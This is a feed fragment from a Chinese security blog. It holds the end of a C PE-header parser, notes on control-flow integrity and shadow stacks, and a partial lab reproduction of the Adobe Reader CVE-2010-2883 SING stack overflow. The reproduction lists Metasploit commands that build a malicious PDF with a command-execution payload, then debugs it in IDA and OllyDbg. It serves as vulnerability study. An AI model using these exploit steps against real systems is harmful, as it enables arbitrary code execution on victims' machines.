class="built_in">printf</span>(<span class="string">"FileAlignment: 0x%08x\n"</span>, pOH-&gt;FileAlignment);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SizeOfImage: 0x%08x\n"</span>, pOH-&gt;SizeOfImage);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SizeOfHeaders: 0x%08x\n"</span>, pOH-&gt;SizeOfHeaders);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NumberOfRvaAndSizes: 0x%08x\n"</span>, pOH-&gt;NumberOfRvaAndSizes);</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*  SectionTable                              */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="keyword">int</span> SectionNumber = <span class="number">0</span>;</span><br><span class="line">DWORD SectionHeaderOffset = (DWORD)pNtH + <span class="number">24</span> + (DWORD)pFH-&gt;SizeOfOptionalHeader; <span class="comment">//节表位置的计算</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--------------------SectionTable---------------------\n"</span>);</span><br><span class="line"><span class="keyword">for</span> (SectionNumber; SectionNumber &lt; pFH-&gt;NumberOfSections; SectionNumber++) &#123;</span><br><span class="line">PIMAGE_SECTION_HEADER pSh = (PIMAGE_SECTION_HEADER)(SectionHeaderOffset + <span class="number">40</span> * SectionNumber);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d 's Name is %s\n"</span>, SectionNumber + <span class="number">1</span>, pSh-&gt;Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VirtualAddress: 0x%08X\n"</span>, (DWORD)pSh-&gt;VirtualAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SizeOfRawData: 0x%08X\n"</span>, (DWORD)pSh-&gt;SizeOfRawData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"PointerToRawData: 0x%08X\n"</span>, (DWORD)pSh-&gt;PointerToRawData);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*  ExportTable                               */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--------------------ExportTable----------------------\n"</span>);</span><br><span class="line">DWORD Export_table_offset = RVAOffset(pNtH, (DWORD)pNtH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)ImageBase + Export_table_offset);</span><br><span class="line">DWORD EXport_table_offset_Name = (DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;Name);</span><br><span class="line">DWORD * pNameOfAddress = (DWORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNames));</span><br><span class="line">DWORD * pFunctionOfAdress = (DWORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfFunctions));</span><br><span class="line">WORD * pNameOrdinalOfAddress = (WORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNameOrdinals));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Name:%s\n"</span>, EXport_table_offset_Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NameOfAddress:%08X\n"</span>, RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNames));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"FunctionOfAdress:%08X\n"</span>, RVAOffset(pNtH, pExportDirectory-&gt;AddressOfFunctions));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NameOrdinalOfAddress:%08X\n"</span>, RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNameOrdinals));</span><br><span class="line"><span class="keyword">if</span> (pExportDirectory-&gt;NumberOfFunctions == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"!!!!!!!!!!!!!!!!!NO EXPORT!!!!!!!!!!!!!!!!!!!!!"</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hMapping != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ImageBase != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">UnmapViewOfFile(ImageBase);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NumberOfNames:%d\n"</span>, pExportDirectory-&gt;NumberOfNames);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NumberOfFunctions:%d\n"</span>, pExportDirectory-&gt;NumberOfFunctions);</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*  ImportTable                               */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--------------------ImportTable----------------------\n"</span>);</span><br><span class="line"><span class="keyword">int</span> cont = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD dwImportOffset = RVAOffset(pNtH, pNtH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">dwImportOffset = dwImportOffset + cont;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)ImageBase + dwImportOffset);</span><br><span class="line"><span class="keyword">if</span> (pImport-&gt;OriginalFirstThunk == <span class="number">0</span> &amp;&amp; pImport-&gt;TimeDateStamp == <span class="number">0</span> &amp;&amp; pImport-&gt;ForwarderChain == <span class="number">0</span> &amp;&amp; pImport-&gt;Name == <span class="number">0</span> &amp;&amp; pImport-&gt;FirstThunk == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">DWORD dwOriginalFirstThunk = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;OriginalFirstThunk);</span><br><span class="line">DWORD dwFirstThunk = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;FirstThunk);</span><br><span class="line">DWORD dwName = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"---------Import File Name: %s\n"</span>, dwName);</span><br><span class="line"><span class="keyword">if</span> (dwOriginalFirstThunk == <span class="number">0x00000000</span>)</span><br><span class="line">&#123;</span><br><span class="line">dwOriginalFirstThunk = dwFirstThunk;</span><br><span class="line">&#125;</span><br><span class="line">DWORD* pdwTrunkData = (DWORD*)dwOriginalFirstThunk;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (pdwTrunkData[n] != <span class="number">0</span>) &#123;</span><br><span class="line">DWORD TrunkData = pdwTrunkData[n];</span><br><span class="line"><span class="keyword">if</span> (TrunkData &lt; IMAGE_ORDINAL_FLAG32)<span class="comment">//名字导入</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME pInportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)ImageBase + RVAOffset(pNtH, TrunkData));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ImportByName: %s\n"</span>, pInportByName-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD FunNumber = (DWORD)(TrunkData - IMAGE_ORDINAL_FLAG32);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ImportByNumber: %-4d \n"</span>, FunNumber);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (x != <span class="number">0</span> &amp;&amp; x % <span class="number">3</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">n++;</span><br><span class="line">x++;</span><br><span class="line">&#125;</span><br><span class="line">cont = cont + <span class="number">40</span>;<span class="comment">//其实这里的40不是太理解，这个导入表不应该只有一个么，为什么是个循环</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageBase)</span><br><span class="line">&#123;</span><br><span class="line">UnmapViewOfFile(ImageBase);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hMapping)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;梳理下PE的文件结构&lt;/p&gt;
    
    </summary>
    
      <category term="程序员的自我修养" scheme="wood1314.github.io/categories/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
    
    
      <category term="逆向" scheme="wood1314.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>CFI与影子堆栈</title>
    <link href="wood1314.github.io/year/06/28/ckur473d40006ab1501ea78nt/"/>
    <id>wood1314.github.io/year/06/28/ckur473d40006ab1501ea78nt/</id>
    <published>2020-06-28T04:03:29.000Z</published>
    <updated>2020-06-28T07:57:39.312Z</updated>
    
    <content type="html"><![CDATA[<p>最近读论文碰到了CFI和影子堆栈相关，记录一下，添加一些自己的感想。</p><p>参考<a href="https://blog.csdn.net/zko1021/article/details/85250383" target="_blank" rel="noopener">https://blog.csdn.net/zko1021/article/details/85250383</a></p><p><a href="http://readm.tech/2016/11/09/cet-shadow_stacks/" target="_blank" rel="noopener">http://readm.tech/2016/11/09/cet-shadow_stacks/</a></p><a id="more"></a><p>本文讨论的原理基于<a href="https://www.researchgate.net/publication/228733728_Control-flow_integrity_principles_implementations_and_applications" target="_blank" rel="noopener">Control-Flow Integrity Principles, Implementations, and Applications</a>这篇论文。</p><h2 id="1-回顾为什么需要CFI"><a href="#1-回顾为什么需要CFI" class="headerlink" title="1 回顾为什么需要CFI"></a>1 回顾为什么需要CFI</h2><h3 id="1-1-劫持控制流"><a href="#1-1-劫持控制流" class="headerlink" title="1.1 劫持控制流"></a>1.1 劫持控制流</h3><ul><li>攻击者能够通过控制流劫持来获取目标机器的控制权，甚至进行提权操作，对目标机器进行全面控制。</li><li>早期的攻击通常采用代码注入的方式，通过上载一段代码，将控制转向这段代码执行。</li><li>代码重用攻击使得硬件支持下的DEP保护机制仍能被绕过。</li></ul><h3 id="1-2-早期防范措施"><a href="#1-2-早期防范措施" class="headerlink" title="1.2 早期防范措施"></a>1.2 早期防范措施</h3><ul><li>堆栈金丝雀[Cowan et al. 1998]，运行时消除缓冲区溢出[Ruwase and Lam 2004]等。</li><li>局限性：缓解范围有限，性能损失高，依赖于硬件修改等。</li><li>What we need：高可靠性，易于理解，强制执行，可部署性，低开销。</li></ul><p>总结下大概早起防范就是金丝雀，和NX保护，以及代码段的随机化。canary保护其实挺强的了，一般的栈溢出是可以做到防护的，但是如果存在类似于任意地址写，格式化字符串漏洞等，还是无法避免返回地址被劫持。</p><h2 id="2-CFI概述"><a href="#2-CFI概述" class="headerlink" title="2 CFI概述"></a>2 CFI概述</h2><p><em>CFI关注的是间接指令，所以在这里对汇编语言中不同寻址方式的指令进行补充说明。</em></p><p>在汇编语言中，根据寻址方式的不同可以分为两种跳转指令。一种是<strong>间接跳转指令</strong>，另一种是<strong>直接跳转指令</strong>。</p><p>直接跳转指令的示例如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL 0x1060000F</span><br></pre></td></tr></table></figure><p>在程序执行到这条语句时，就会将指令寄存器的值替换为0x1060000F。这种在指令中直接给出跳转地址的寻址方式就叫做直接转移。在高级语言中, 像if-else，静态函数调用这种跳转目标往往可以确定的语句就会被转换为直接跳转指令。</p><p>间接跳转指令则是使用数据寻址方式间接的指出转移地址，如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JMP EBX</span><br></pre></td></tr></table></figure><p>执行完这条指令之后，指令寄存器的值就被替换为EBX寄存器的值。它的转换对象为作为回调参数的函数指针等动态决定目标地址的语句。</p><p>在CFI中还有一个比较特殊的分类方式，就是<strong>前向和后向转移</strong>。将控制权定向到程序中一个新位置的转移方式， 就叫做前向转移, 比如jmp和call指令；而将控制权返回到先前位置的就叫做后向转移，最常见的就是ret指令。</p><p>将以上两种分类方式结合起来，前向转移指令call和jmp根据寻址方式不同又可以分为直接jmp, 间接jmp，直接call，间接call四种。而后向<strong>转移指令ret没有操作数</strong>，它的目标地址计算是通过从栈中弹出的数来决定的。正<strong>因为ret指令的特性，引发了一系列针对返回地址的攻击</strong>。</p><h3 id="2-2-核心思想"><a href="#2-2-核心思想" class="headerlink" title="2.2 核心思想"></a>2.2 核心思想</h3><p>限制程序运行中的控制转移，使之始终处于原有的控制流图所限定的范围内。<br><strong>它规定软件执行必须遵循提前确定的控制流图（CFG）的路径。</strong></p><p>通过分析程序的控制流图，获取间接转移指令（包括间接跳转、间接调用、和函数返回指令）目标的白名单，并在运行过程中，核对间接转移指令的目标是否在白名单中。</p><p><strong>通过二进制代码重写实现：插桩—— IDs ID检查</strong></p><p>利用二进制重写技术向软件函数入口及调用返回处分别插入标识符ID和ID_check，通过对比ID和ID_check的值是否一致判断软件的函数执行过程是否符合预期，从而判断软件是否被篡改。</p><h3 id="2-3-示例：通过插桩执行CFI"><a href="#2-3-示例：通过插桩执行CFI" class="headerlink" title="2.3 示例：通过插桩执行CFI"></a>2.3 示例：通过插桩执行CFI</h3><p>CFI要求在程序执行期间，只要机器代码指令转移控制，只能转移到有效目标，这是由提前创建的CFG确定的。</p><blockquote><p>文中提到，期望在不久的将来部署硬件CFI支持是不现实的，所以该文章仅讨论软件CFI实现（也是有局限性的，在提出和发展那篇里曾提到）。内联CFI插桩可以在当前处理器上的软件中实现，特别是在x86处理器上，只需要适度的开销。</p></blockquote><p>CFI插桩根据给定的CFG修改每个源指令和计算控制流传输的每个可能的目标指令。</p><p><em>示例：</em></p><p><img src="/28/ckur473d40006ab1501ea78nt/1.png" alt></p><p>左侧是一个C程序片段，其中函数sort2调用sort的函数排序两次，首先使用lt，然后使用gt。它们作为<strong>指向比较函数的指针</strong>。右侧显示了这四个函数的二进制代码块的轮廓以及它们之间的所有CFG边。</p><ul><li>直接调用的边为浅色虚线箭头</li><li>源指令的边为实线箭头</li><li>返回边为虚线箭头</li></ul><p>因此，CFI检测包括sort2主体中的两个ID，以及从排序返回时的ID检查，使用55（这里是随意使用55来表示）作为ID位模式。同样，因为sort可以调用lt 或者gt，两个比较函数都以ID 17开头; 并且使用寄存器R中的函数指针的调用指令对17执行ID检查。最后，ID 23在sort中标识比较调用点之后的块，因此两个比较函数都检查返回ID 23。</p><p>CFI检测不会影响直接函数调用：<strong>只有间接调用需要ID检查，并且只有间接调用的函数（例如虚方法）才需要添加ID。</strong></p><p>函数返回多个ID检查时，必须在每个函数调用点之后插入ID，无论该函数是否间接调用。剩余的计算控制流通常是switch语句和异常的结果。在两种情况下，每个可能的目标都需要一个ID，并且在发送点需要ID检查。</p><h3 id="2-4-CFI插桩代码"><a href="#2-4-CFI插桩代码" class="headerlink" title="2.4 CFI插桩代码"></a>2.4 CFI插桩代码</h3><p>选择特定的二进制码序列实现ID和ID检查。</p><p><img src="/28/ckur473d40006ab1501ea78nt/2.png" alt></p><p>上图中，这里，目标已在ecx中，所以ID检查不必将其移动到寄存器（通常ID检查需要这样做来避免竞争条件）。跳转指令jmp ecx的目标可能是来自堆栈的mov（下图所示）。</p><p>在（a）中，ID作为数据插入到目标mov指令之前，并且ID检查使用lea指令修改计算的目标，以跳过四个ID字节。ID检查直接将原始目的地与ID值进行比较。ID位模式嵌入在ID-check cmp操作码字节内。 因此，在（a）中，可能以某种方式影响ecx寄存器的值的攻击者可能会导致跳转到jne指令而不是预期的目标。</p><p>（b）通过在ID检查中使用ID-1作为常量并将其递增以在运行时计算ID来避免（a）的微妙之处。 另外，替代方案（b）不修改计算的跳转目标，而是有效地在目标的开始处插入labelID：使用无副作用的x86预取指令来合成labelID指令。（其实这个b我不太懂那个inc eax这个的作用)</p><p><img src="/28/ckur473d40006ab1501ea78nt/3.png" alt></p><h3 id="2-5-CFI的三个重要假设"><a href="#2-5-CFI的三个重要假设" class="headerlink" title="2.5 CFI的三个重要假设"></a>2.5 CFI的三个重要假设</h3><p>实现CFI，三个假设成立至关重要。 这三个假设是：</p><p><strong>UNQ.</strong> 唯一ID：在CFI检测之后，除了ID和ID检查之外，选择为ID的位模式不得出现在代码存储器中的任何位置。通过使ID足够大（例如32位，对于合理大小的软件）并且通过选择ID使得它们不与软件的其余部分中的操作码字节冲突，可以容易地实现该属性。</p><p><strong>NWC.</strong> 不可写代码：程序必须无法在运行时修改代码内存。否则，攻击者可能能够绕过CFI，例如通过覆盖ID检查。除了在加载动态库和运行时代码生成期间，NWC在大多数当前系统中已经是正确的。</p><p><strong>NXD.</strong> 不可执行数据：程序必须不能像执行代码那样执行数据。否则，攻击者可能会导致执行标有预期ID的数据。最新的x86处理器上的硬件支持NXD，Windows XP SP2使用此支持来强制分离代码和数据[Microsoft Corporation 2004]。 NXD也可以用软件实现[PaX Project 2004]。NXD本身（没有CFI）阻止了一些攻击，但不适于那些利用预先存在的代码的攻击，例如“jump-to-libc”攻击。</p><h3 id="2-6-CFI执行的阶段"><a href="#2-6-CFI执行的阶段" class="headerlink" title="2.6 CFI执行的阶段"></a>2.6 CFI执行的阶段</h3><p>第一阶段，即用于CFI执行的CFG的构建，从程序分析到安全策略规范。实际实施可以使用标准控制流分析技术（例如，[Aho et al. 1985; Atkinson 2002; Wagner and Dean 2001]）。</p><p>在CFI检测之后（可能在安装时），另一种机制可以建立UNQ假设。无论何时安装或修改软件，都可以更新ID以保持唯一性，就像某些操作系统中的预绑定信息一样[Apple Computer 2003]。</p><p>最后，CFI验证阶段可以静态验证直接跳转和类似指令，正确插入ID和ID检查以及UNQ属性。验证可以看作是PCC校对检查的一个特例，其中插桩不需要明确的逻辑校验。建立CFI只需要验证：设备中的设计或实施缺陷不会危及安全性。</p><h3 id="2-7-CFI实施"><a href="#2-7-CFI实施" class="headerlink" title="2.7  CFI实施"></a>2.7  CFI实施</h3><blockquote><p>Vulcan [Srivastava et al.2001]：一个成熟的、最先进的x86二进制文件检测系统，既不需要重新编译也不需要源代码访问。该系统以实用的方式解决了二进制代码重写的挑战。</p></blockquote><p>使用Vulcan来构建正在检测的程序的CFG。这个CFG构造正确处理执行计算控制流传输的x86指令，包括函数返回，通过函数指针调用，以及为switch语句和动态调度发出的指令。每个计算出的调用指令可以转到任何采用其地址的函数：通过对二进制文件中的重定位条目进行流不敏感分析来发现这些函数。</p><h2 id="3-影子栈"><a href="#3-影子栈" class="headerlink" title="3 影子栈"></a>3 影子栈</h2><p>当启用影子堆栈时，Near CALL压入返回地址到数据堆栈和影子堆栈上；Near RET 从影子堆栈和数据堆栈弹出返回地址。 如果指定了可选的“n”操作数，则数据堆栈指针（ESP / RSP）可选地进一步增加“n”个字节，但是影子堆栈指针（SSP）不递增。如果从两个堆栈弹出的返回地址不相同，那么处理器会导致#CP（near-ret）异常。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近读论文碰到了CFI和影子堆栈相关，记录一下，添加一些自己的感想。&lt;/p&gt;
&lt;p&gt;参考&lt;a href=&quot;https://blog.csdn.net/zko1021/article/details/85250383&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/zko1021/article/details/85250383&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://readm.tech/2016/11/09/cet-shadow_stacks/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://readm.tech/2016/11/09/cet-shadow_stacks/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="程序员的自我修养" scheme="wood1314.github.io/categories/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
    
    
      <category term="保护措施" scheme="wood1314.github.io/tags/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2883 Adobe Reader TFF字体SING表栈溢出</title>
    <link href="wood1314.github.io/year/06/04/ckur473d8000cab155bfomfcj/"/>
    <id>wood1314.github.io/year/06/04/ckur473d8000cab155bfomfcj/</id>
    <published>2020-06-04T12:20:05.000Z</published>
    <updated>2020-07-08T14:35:09.599Z</updated>
    
    <content type="html"><![CDATA[<p>在Adobe Reader和Acrobat 9.4之前的9.x版本中用于实现CoolType(清晰显示文本的字体还原技术)技术的库CoolType.dll中在解析TrueType字体文件中的SING表的uniqueName字段时调用的strcat函数<strong>未检查长度</strong>导致存在基于栈的缓冲区溢出漏洞。远程攻击者可构造恶意的SmartINdependent Glyphlets (SING)表修改内存数据从而执行任意代码。</p><a id="more"></a><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p><strong>漏洞编号:</strong> CVE-2010-2883</p><p><strong>复现环境:</strong></p><p>操作系统 Windows XP SP3</p><p>虚拟机 Vmware 15 Pro</p><p>漏洞软件 Adobe Reader 9.3.4</p><h2 id="样本生成"><a href="#样本生成" class="headerlink" title="样本生成"></a>样本生成</h2><p>这里我们先借助Metasploit帮助我们生成一个样本用于动态调试(之后会分析这个样本是如何构造出来的)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>首先在Kali中调用msfconsole唤出我们的msf。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search cve-2010-2883</span><br></pre></td></tr></table></figure><p>搜索cve-2010-2883漏洞编号可以列出可用的exploit。</p><p>我是unbuntu系统，这个文件在/opt目录下</p><p>然后找/metasploit-framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</p><p>为了便于等下动态调试识别一些关键数据块，我们考虑修改一下这个exploit的一处地方。</p><p>在这个exploit的102行处，将下面这句代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sing &lt;&lt; rand_text(<span class="number">0x254</span> - sing.length)</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sing &lt;&lt; &quot;A&quot; * (0x254 - sing.length)</span><br></pre></td></tr></table></figure><p>这里的rand_text主要作用是取随机字符，目的是为了增强样本的随机性从而躲避一些检测。这里我们只做研究之用，所以不必随机。修改之后保存</p><p>使用这个exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><p>然后设置有效载荷为windows/exec用来执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> cmd calc.exe</span><br></pre></td></tr></table></figure><p>设置为启动计算器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> filename cve20102883.pdf</span><br></pre></td></tr></table></figure><p>最后设置一下生成的样本文件名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit</span><br></pre></td></tr></table></figure><p>执行一下，样本就被生成在了 /root/.msf4/local/cve20102883.pdf</p><p>然后拷贝出来放到Windows SP3虚拟机上的复现环境中。</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>由于已经知道是SING处出了问题，那么用ida直接查找字符串，定位到这里，漏洞函数就是strcat。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD85                 cmp     eax, esi</span><br><span class="line">.text:0803DD85 ;   &#125; // starts at 803DD53</span><br><span class="line">.text:0803DD87 ;   try &#123;</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax]</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; char *</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char *</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat</span><br></pre></td></tr></table></figure><p>先分析strcat的参数，第一个参数是栈上一个地址，字符串拼接后会把字符拼接到这里，可以看到前面并没有对长度进行限制。</p><p>第二个参数盲猜应该是我们构造的rop链的地址了。</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>在复现环境中把Adobe Reader 9.3.4 启动程序载入OllyDbg。加载之后F9运行。此时OllyDbg显示当前调试的程序是运行状态，实际上这个时候Adobe Reader就已经加载了CoolType.dll文件了。通过刚刚的静态分析我们了解到aSing在地址0x0803DD74处被引用。因此我们可以先在OD中在这个地址处下一个断点。快捷键Ctrl+G输入0x0803DD74回车跳转到该地址F2下断点。</p><p>我们将刚才的样本拖入到Adobe Reader中。程序就会停在刚才下的断点上面。</p><p>F7单步到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0803DD7A    8D4D DC         lea ecx,dword ptr ss:[ebp-0x24]</span><br></pre></td></tr></table></figure><p>执行这句指令之后我们来看看ecx到底存了什么。此时的ecx = 0x0012E4B4，首先猜测这是一个指针地址，定位到数据区域之后，取出前32位的十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0012E4B4 F4 41 6D 04</span><br></pre></td></tr></table></figure><p>由于在X86架构下是小端字节序，因此我们将数据排列成0x046D41F4。这应该就是ecx指针所指向的地址，定位到数据区域。可以看到如下数据</p><p>在分析这段数据之前我们先来看看TrueType字体格式标准文档里是怎么说的。</p><p><img src="/04/ckur473d8000cab155bfomfcj/1.png" alt></p><p>在TrueType字体文件中，从0字节偏移的位置开始处有一个表目录。且这个表目录的第一个字段是名为sfnt version是用来表明所用ttf格式版本的字段。在文档中清楚的标注了，对于1.0版本的TTF字体文件开头要用0x00010000来表示版本。回到我们刚才0x046D41F4位置处的数据，会发现开头正好是0x00010000，这就证明了ecx保存的是一个指向ttf对象的指针地址并且在这里应该是作为this指针。</p><p>分析到这里，继续我们的动态调试。接下来遇到了一个call指令，意味着即将调用一个函数。在调用函数前我们不妨先看看这个函数传入了哪些参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0803DD74    68 4CDB1908     push CoolType.0819DB4C      ; ASCII &quot;SING&quot;</span><br><span class="line">0803DD79    57              push edi</span><br></pre></td></tr></table></figure><p>很明显它将SING字符串当作参数了。这里我们单步F8不进入call函数内部。</p><figure 